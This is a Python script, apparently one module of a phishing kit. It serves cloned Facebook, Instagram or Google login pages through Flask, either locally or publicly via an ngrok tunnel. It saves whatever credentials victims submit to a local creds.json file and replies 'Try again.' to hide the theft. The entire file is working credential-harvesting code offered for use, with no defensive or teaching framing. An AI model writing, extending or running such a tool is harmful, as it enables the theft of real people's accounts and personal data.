# phishing.py
import os, time
from flask import Flask, request, render_template_string
from utils import get_local_ip, run_cmd, log_event

TEMPLATES = {
    "1": ("Facebook", "templates/facebook.html"),
    "2": ("Instagram", "templates/instagram.html"),
    "3": ("Google", "templates/google.html")
}
CREDS_FILE = "creds.json"

def start_phishing():
    # Choose template
    print("\\nAvailable Templates:")
    for k, (name, _) in TEMPLATES.items():
        print(f"[{k}] {name}")
    choice = input("Template> ")
    if choice not in TEMPLATES:
        print("[!] Invalid template.")
        return
    _, tpl = TEMPLATES[choice]
    if not os.path.isfile(tpl):
        print("[!] Template file missing.")
        return

    app = Flask(__name__)

    @app.route('/')
    def serve():
        with open(tpl) as f: return render_template_string(f.read())

    @app.route('/login', methods=['POST'])
    def collect():
        creds = request.form.to_dict()
        entry = { time.ctime(): creds }
        with open(CREDS_FILE, 'a') as f:
            f.write(f"{entry}\\n")
        return "Try again."
    
    # Choose mode
    print("\\n[1] Local   [2] Ngrok")
    mode = input("Mode> ")
    if mode == "1":
        ip = get_local_ip()
        print(f"Serving on http://{ip}:5000")
        log_event("Phishing: local")
        app.run(host="0.0.0.0", port=5000)
    elif mode == "2":
        if not os.path.isfile("ngrok"):
            print("[!] Install ngrok first.")
            return
        run_cmd(["./ngrok", "http", "5000"])
        time.sleep(3)
        res = run_cmd(["curl", "-s", "http://localhost:4040/api/tunnels"])
        out = res.stdout
        if 'https://' not in out:
            print("[!] Ngrok error.")
            return
        url = out.split('"public_url":"')[1].split('"')[0]
        print(f"Ngrok URL: {url}")
        log_event(f"Phishing: ngrok {url}")
        app.run(host="0.0.0.0", port=5000)
    else:
        print("[!] Invalid mode.")
